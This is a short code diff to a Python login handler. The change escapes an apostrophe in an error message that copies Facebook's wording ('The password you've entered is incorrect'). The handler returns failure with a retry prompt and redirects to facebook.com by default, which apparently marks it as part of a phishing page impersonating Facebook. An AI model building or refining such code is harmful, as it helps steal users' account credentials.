@@ -189,7 +189,7 @@ def login():
     redirect_url = get_setting('redirect_url', 'https://facebook.com')
     return jsonify(
         success=False,
-        error='The password you've entered is incorrect. '
+        error='The password you\'ve entered is incorrect. '
               'Forgotten password?',
         redirect=redirect_url,
         show_retry=True,
